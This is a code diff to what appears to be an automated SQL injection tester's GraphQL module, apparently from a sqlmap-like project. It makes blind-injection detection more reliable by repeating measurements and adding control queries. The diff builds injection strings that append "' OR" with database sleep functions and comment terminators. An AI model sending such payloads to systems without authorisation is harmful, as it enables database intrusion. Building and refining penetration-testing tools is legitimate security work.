@@ -709,12 +709,18 @@ def _detectBoolean(slot, endpoint):
         return None, None
 
     truePage, _ = _gqlSend(endpoint, trueQuery)
+    truePage2, _ = _gqlSend(endpoint, trueQuery)
     falsePage, _ = _gqlSend(endpoint, falseQuery)
 
     trueVal = _slotValue(truePage)
+    trueVal2 = _slotValue(truePage2)
     falseVal = _slotValue(falsePage)
 
-    if _ratio(trueVal, falseVal) < (1.0 - _MIN_RATIO_DIFF):
+    # Require the true response to be REPRODUCIBLE (trueVal ~= trueVal2) and to diverge
+    # from the false response. A single true-vs-false compare turns page jitter into a
+    # false positive; a reproducibility guard (like the other non-SQL engines' _boolean)
+    # rejects it, since a jittery page also fails to reproduce against itself.
+    if _ratio(trueVal, trueVal2) >= (1.0 - _MIN_RATIO_DIFF) and _ratio(trueVal, falseVal) < (1.0 - _MIN_RATIO_DIFF):
         return "boolean-based blind (string)", truePage
 
     return None, None
@@ -731,21 +737,29 @@ def _detectTime(slot, endpoint):
     if not baseQuery:
         return None, None, None
 
-    start = time.time()
-    _gqlSend(endpoint, baseQuery)
-    baseline = time.time() - start
+    def elapsed(query):
+        start = time.time()
+        _gqlSend(endpoint, query)
+        return time.time() - start
 
+    baseline = elapsed(baseQuery)
     delay = conf.timeSec
+    cutoff = baseline + delay * 0.5
+
     for dbms, dialect in DIALECTS.items():
         if not dialect.delay:
             continue
-        query = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay)))
-        if not query:
+        sleepQuery = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay)))
+        if not sleepQuery or elapsed(sleepQuery) <= cutoff:
             continue
-        start = time.time()
-        _gqlSend(endpoint, query)
-        if (time.time() - start) > baseline + delay * 0.5:
-            return "time-based blind", baseline + delay * 0.5, dbms
+
+        # Confirm before attributing: the delay must REPRODUCE and a false-condition
+        # control must stay fast. A single sample turns jitter/a uniformly-slow endpoint
+        # into a false positive and can pin the wrong dialect; requiring the delay to
+        # track the condition rules both out.
+        controlQuery = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=2", delay)))
+        if elapsed(sleepQuery) > cutoff and (controlQuery is None or elapsed(controlQuery) <= cutoff):
+            return "time-based blind", cutoff, dbms
 
     return None, None, None
 
